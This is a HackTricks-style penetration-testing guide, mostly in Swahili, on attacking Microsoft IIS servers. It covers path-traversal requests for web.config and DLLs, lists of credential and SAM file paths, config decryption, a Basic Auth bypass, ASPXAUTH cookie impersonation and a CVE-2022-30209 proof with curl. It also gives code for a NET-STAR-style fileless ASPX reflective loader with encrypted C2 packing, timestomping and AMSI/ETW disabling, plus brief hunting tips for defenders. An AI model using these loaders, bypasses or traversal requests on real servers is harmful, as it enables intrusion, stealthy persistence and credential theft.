# IIS - Internet Information Services

{{#include ../../banners/hacktricks-training.md}}

Aina za extensions za faili zinazotekelezwa za kujaribu:

- asp
- aspx
- config
- php

## Ufichaji wa Anwani ya IP ya Ndani

Katika seva yoyote ya IIS ambapo unapata 302 unaweza kujaribu kuondoa Host header na kutumia HTTP/1.0, na ndani ya majibu header ya Location inaweza kukuonyesha anwani ya IP ya ndani:
```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```
Majibu yanayofichua anwani ya IP ya ndani:
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```
## Endesha faili za .config

Unaweza kupakia .config files na kuzitumia kuendesha msimbo. Njia moja ya kufanya hivyo ni kuambatisha msimbo mwishoni mwa faili ndani ya HTML comment: [Download example here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

Taarifa zaidi na mbinu za kutumia udhaifu huu [here](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

## IIS Discovery Bruteforce

Pakua orodha niliyoitengeneza:

{{#file}}
iisfinal.txt
{{#endfile}}

Ilimetengenezwa kwa kuunganisha yaliyomo kwenye orodha zifuatazo:

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

Itumie bila kuongeza extension; faili zinazohitaji tayari zinao.

## Path Traversal

### Leaking source code

Angalia maelezo kamili katika: [https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

> [!TIP]
> Kwa muhtasari, kuna web.config files ndani ya folda za application zenye rufaa kwa "**assemblyIdentity**" files na "**namespaces**". Kwa kutumia taarifa hizi inawezekana kujua **ambapo executables ziko** na kuzishusha.\
> Kutokana na **downloaded Dlls** pia inawezekana kupata **new namespaces** ambazo unapaswa kujaribu kufikia na kupata faili ya web.config ili kupata new namespaces na assemblyIdentity.\
> Pia, faili **connectionstrings.config** na **global.asax** zinaweza kuwa na taarifa za kuvutia.

Katika **.Net MVC applications**, faili ya **web.config** ina jukumu muhimu kwa kubainisha kila binary file ambayo application inategemea kupitia XML tags za **"assemblyIdentity"**.

### **Kuchunguza Faili za Binary**

Mfano wa kufikia faili ya **web.config** umeonyeshwa hapa chini:
```html
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```
Ombi hili linafunua mipangilio na utegemezi mbalimbali, kama vile:

- **EntityFramework** version
- **AppSettings** kwa webpages, client validation, na JavaScript
- **System.web** mipangilio kwa uthibitishaji na runtime
- **System.webServer** mipangilio ya modules
- **Runtime** assembly bindings kwa maktaba nyingi kama **Microsoft.Owin**, **Newtonsoft.Json**, na **System.Web.Mvc**

Mipangilio hii inaonyesha kuwa baadhi ya faili, kama **/bin/WebGrease.dll**, ziko ndani ya folda /bin ya application.

### **Root Directory Files**

Faili zinazopatikana katika saraka ya mzizi, kama **/global.asax** na **/connectionstrings.config** (ambazo zina nywila nyeti), ni muhimu kwa usanidi na uendeshaji wa application.

### **Namespaces and Web.Config**

MVC applications pia huweka **web.config files** za ziada kwa namespaces maalum ili kuepuka matamko yanayojirudia katika kila faili, kama ilivyoonyeshwa na ombi la kupakua mwingine **web.config**:
```html
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```
### **Kupakua DLLs**

Kutajwa kwa namespace maalum kunadhihirisha uwepo wa DLL yenye jina "**WebApplication1**" kwenye saraka ya /bin. Kufuatia hayo, ombi la kupakua the **WebApplication1.dll** linaonyeshwa:
```html
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```
Hii inaonyesha uwepo wa DLL nyingine muhimu, kama **System.Web.Mvc.dll** na **System.Web.Optimization.dll**, katika saraka ya /bin.

Katika senario ambapo DLL inayoleta namespace inayoitwa **WebApplication1.Areas.Minded**, attacker anaweza kubaini uwepo wa web.config nyingine katika njia zinazotabirika, kama **/area-name/Views/**, zenye usanidi maalum na marejeo kwa DLL nyingine katika saraka ya /bin. Kwa mfano, ombi kwa **/Minded/Views/web.config** linaweza kufichua usanidi na namespaces zinazobainisha uwepo wa DLL nyingine, **WebApplication1.AdditionalFeatures.dll**.

### Faili za kawaida

Kutoka [here](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```
## HTTPAPI 2.0 404 Error

If you see an error like the following one:

![](<../../images/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (10) (2).png>)

Ikiwa unaona kosa kama la ifuatayo:

Hii ina maana serveri **haikupokea jina sahihi la domain** ndani ya Host header.  
Ili kufikia ukurasa wa wavuti unaweza kuangalia **SSL Certificate** iliyotumwa na labda utapata jina la domain/subdomain ndani yake. Ikiwa halipo hapo unaweza kuhitaji kufanya **brute force VHosts** hadi upate ile sahihi.

## Fungua configuration iliyosimbwa na ASP.NET Core Data Protection key rings

Mifano miwili ya kawaida ya kulinda siri kwenye apps za IIS-hosted .NET ni:
- ASP.NET Protected Configuration (RsaProtectedConfigurationProvider) for web.config sections like <connectionStrings>.
- ASP.NET Core Data Protection key ring (persisted locally) used to protect application secrets and cookies.

Ikiwa una ufikiaji wa filesystem au ufikiaji wa interactive kwenye web server, co-located keys mara nyingi zinawezesha decryption.

- ASP.NET (Full Framework) – decrypt protected config sections with aspnet_regiis:
```cmd
# Decrypt a section by app path (site configured in IIS)
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe -pd "connectionStrings" -app "/MyApplication"

# Or specify the physical path (-pef/-pdf write/read to a config file under a dir)
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe -pdf "connectionStrings" "C:\inetpub\wwwroot\MyApplication"
```
- ASP.NET Core – tafuta Data Protection key rings zilizohifadhiwa kwa ndani (XML/JSON files) katika maeneo kama:
- %PROGRAMDATA%\Microsoft\ASP.NET\DataProtection-Keys
- HKLM\SOFTWARE\Microsoft\ASP.NET\Core\DataProtection-Keys (registry)
- App-managed folder (e.g., App_Data\keys or a Keys directory next to the app)

Ikiwa key ring inapatikana, operator anayeendesha kwa utambulisho wa app anaweza kuanzisha IDataProtector na purposes sawa na ku-unprotect siri zilizohifadhiwa. Misconfigurations zinazohifadhi key ring pamoja na faili za app zinafanya offline decryption kuwa rahisi mara host inapoharibiwa.

## IIS fileless backdoors and in-memory .NET loaders (NET-STAR style)

The Phantom Taurus/NET-STAR toolkit inaonyesha mtindo uliokomaa kwa fileless IIS persistence na post‑exploitation kabisa ndani ya w3wp.exe. Mawazo ya msingi yanaweza kutumika kwa upana kwa custom tradecraft na kwa detection/hunting.

Key building blocks
- ASPX bootstrapper hosting an embedded payload: ukurasa mmoja .aspx (mfano, OutlookEN.aspx) unabeba Base64‑encoded, optionally Gzip‑compressed .NET DLL. Baada ya trigger request, inafanya decode, decompress na reflectively loads ndani ya current AppDomain na huitisha main entry point (mfano, ServerRun.Run()).
- Cookie‑scoped, encrypted C2 with multi‑stage packing: tasks/results zimefungwa kwa Gzip → AES‑ECB/PKCS7 → Base64 na kusogezwa kupitia seemingly legitimate cookie‑heavy requests; operators walitumia delimiters imara (mfano, "STAR") kwa chunking.
- Reflective .NET execution: inakubali arbitrary managed assemblies kama Base64, load via Assembly.Load(byte[]) na kupitisha operator args kwa module swaps haraka bila kugusa disk.
- Operating in precompiled ASP.NET sites: add/manage auxiliary shells/backdoors hata wakati site imeprecompiled (mfano, dropper inaongeza dynamic pages/handlers au inatumia config handlers) – exposed by commands such as bypassPrecompiledApp, addshell, listshell, removeshell.
- Timestomping/metadata forgery: expose changeLastModified action na timestomp wakati wa deployment (ikiwa ni pamoja na future compilation timestamps) ili kuzuia DFIR.
- Optional AMSI/ETW pre‑disable for loaders: second‑stage loader inaweza kuzima AMSI na ETW kabla ya kuita Assembly.Load ili kupunguza ukaguzi wa in‑memory payloads.

Minimal ASPX loader pattern
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.IO.Compression" %>
<%@ Import Namespace="System.Reflection" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e){
// 1) Obtain payload bytes (hard‑coded blob or from request)
string b64 = /* hardcoded or Request["d"] */;
byte[] blob = Convert.FromBase64String(b64);
// optional: decrypt here if AES is used
using(var gz = new GZipStream(new MemoryStream(blob), CompressionMode.Decompress)){
using(var ms = new MemoryStream()){
gz.CopyTo(ms);
var asm = Assembly.Load(ms.ToArray());
// 2) Invoke the managed entry point (e.g., ServerRun.Run)
var t = asm.GetType("ServerRun");
var m = t.GetMethod("Run", BindingFlags.Public|BindingFlags.NonPublic|BindingFlags.Static|BindingFlags.Instance);
object inst = m.IsStatic ? null : Activator.CreateInstance(t);
m.Invoke(inst, new object[]{ HttpContext.Current });
}
}
}
</script>
```
Misaada ya Packing/crypto (Gzip + AES‑ECB + Base64)
```csharp
using System.Security.Cryptography;

static byte[] AesEcb(byte[] data, byte[] key, bool encrypt){
using(var aes = Aes.Create()){
aes.Mode = CipherMode.ECB; aes.Padding = PaddingMode.PKCS7; aes.Key = key;
ICryptoTransform t = encrypt ? aes.CreateEncryptor() : aes.CreateDecryptor();
return t.TransformFinalBlock(data, 0, data.Length);
}
}

static string Pack(object obj, byte[] key){
// serialize → gzip → AES‑ECB → Base64
byte[] raw = Serialize(obj);                    // your TLV/JSON/msgpack
using var ms = new MemoryStream();
using(var gz = new GZipStream(ms, CompressionLevel.Optimal, true)) gz.Write(raw, 0, raw.Length);
byte[] enc = AesEcb(ms.ToArray(), key, true);
return Convert.ToBase64String(enc);
}

static T Unpack<T>(string b64, byte[] key){
byte[] enc = Convert.FromBase64String(b64);
byte[] cmp = AesEcb(enc, key, false);
using var gz = new GZipStream(new MemoryStream(cmp), CompressionMode.Decompress);
using var outMs = new MemoryStream(); gz.CopyTo(outMs);
return Deserialize<T>(outMs.ToArray());
}
```
Mtiririko wa Cookie/session na command surface
- Bootstrap ya session na tasking hubebwa kupitia cookies ili kuchanganyika na shughuli za kawaida za wavuti.
- Amri zilizobainika katika mazingira halisi ziliwemo: fileExist, listDir, createDir, renameDir, fileRead, deleteFile, createFile, changeLastModified; addshell, bypassPrecompiledApp, listShell, removeShell; executeSQLQuery, ExecuteNonQuery; and dynamic execution primitives code_self, code_pid, run_code for in‑memory .NET execution.

Zana ya Timestomping
```csharp
File.SetCreationTime(path, ts);
File.SetLastWriteTime(path, ts);
File.SetLastAccessTime(path, ts);
```
Kuzima Inline ya AMSI/ETW kabla ya Assembly.Load (loader variant)
```csharp
// Patch amsi!AmsiScanBuffer to return E_INVALIDARG
// and ntdll!EtwEventWrite to a stub; then load operator assembly
DisableAmsi();
DisableEtw();
Assembly.Load(payloadBytes).EntryPoint.Invoke(null, new object[]{ new string[]{ /* args */ } });
```
Angalia mbinu za kuzuia AMSI/ETW katika: windows-hardening/av-bypass.md

Vidokezo vya kuwinda (walinzi)
- Ukurasa mmoja wa ASPX usio wa kawaida wenye blobs ndefu sana za Base64/Gzip; maombi ya POST yenye cookie nyingi.
- Managed modules ambazo hazina backup ndani ya w3wp.exe; mistringi kama Encrypt/Decrypt (ECB), Compress/Decompress, GetContext, Run.
- Vigawanyo vinavyorudiwa kama "STAR" kwenye trafiki; timestamps zisizolingana au hata za baadaye kwenye ASPX/assemblies.

## Udhaifu za zamani za IIS zinazostahili kutafutwa


### Microsoft IIS tilde character “\~” Vulnerability/Feature – Short File/Folder Name Disclosure

Unaweza kujaribu **kuorodhesha folda na faili** ndani ya kila folder uliogundua (hata ikiwa inahitaji Basic Authentication) kwa kutumia **mbinu**.\
Kikwazo kikuu cha mbinu hii ikiwa server ina udhaifu ni kuwa **inaweza kupata hadi herufi 6 za kwanza za jina la kila faili/folda na herufi 3 za kwanza za extension** za faili.

Unaweza kutumia [https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner) kujaribu udhaifu huu:`java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/`

![](<../../images/image (844).png>)

Utafiti wa awali: [https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf](https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf)

Unaweza pia kutumia **metasploit**: `use scanner/http/iis_shortname_scanner`

Wazo zuri la **kupata jina la mwisho** la faili zilizogunduliwa ni **kuwauliza LLMs** kwa chaguzi kama ilivyofanywa kwenye script [https://github.com/Invicti-Security/brainstorm/blob/main/fuzzer_shortname.py](https://github.com/Invicti-Security/brainstorm/blob/main/fuzzer_shortname.py)

### Basic Authentication bypass

**Bypass** Basic Authentication (**IIS 7.5**) kwa kujaribu kufikia: `/admin:$i30:$INDEX_ALLOCATION/admin.php` or `/admin::$INDEX_ALLOCATION/admin.php`

Unaweza kujaribu **kuchanganya** udhaifu huu na ule uliopita ili kupata **folda** mpya na **kupitisha** authentication.

## ASP.NET Trace.AXD enabled debugging

ASP.NET ina mode ya debugging na faili yake inaitwa `trace.axd`.

Inahifadhi log ya kina sana ya maombi yote yaliyotumiwa kwa application kwa kipindi fulani.

Taarifa hizi zinajumuisha IP's za wateja wa mbali, session IDs, cookies zote za request na response, physical paths, taarifa za source code, na pengine hata usernames na passwords.

[https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)

![Screenshot 2021-03-30 at 13 19 11](https://user-images.githubusercontent.com/31736688/112974448-2690b000-915b-11eb-896c-f41c27c44286.png)

## ASPXAUTH Cookie

ASPXAUTH inatumia taarifa zifuatazo:

- **`validationKey`** (string): hex-encoded key to use for signature validation.
- **`decryptionMethod`** (string): (default “AES”).
- **`decryptionIV`** (string): hex-encoded initialization vector (defaults to a vector of zeros).
- **`decryptionKey`** (string): hex-encoded key to use for decryption.

Walakini, baadhi ya watu watatumia **default values** za vigezo hivi na watatumia kama **cookie the email of the user**. Kwa hiyo, ikiwa unaweza kupata tovuti inayotumia **same platform** inayotumia cookie ya ASPXAUTH na wewe **create a user with the email of the user you want to impersonate** kwenye server inayoshambuliwa, unaweza kuwa na uwezo wa **use the cookie from the second server in the first one** na kuiga mtumiaji.\
Shambulizi hili liliwahi kufanikiwa katika [**writeup**](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19).

## IIS Authentication Bypass with cached passwords (CVE-2022-30209) <a href="#id-3-iis-authentication-bypass" id="id-3-iis-authentication-bypass"></a>

[Full report here](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html): Mdudu katika code **haukukagua kikamilifu password iliyotolewa na mtumiaji**, hivyo mshambuliaji ambaye **password hash yake inagonga key** ambayo tayari ipo kwenye **cache** ataweza kuingia kama mtumiaji huyo.
```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```
## Marejeo

- [Unit 42 – Phantom Taurus: A New Chinese Nexus APT and the Discovery of the NET-STAR Malware Suite](https://unit42.paloaltonetworks.com/phantom-taurus/)
- [AMSI/ETW bypass background (HackTricks)](../../windows-hardening/av-bypass.md)

{{#include ../../banners/hacktricks-training.md}}
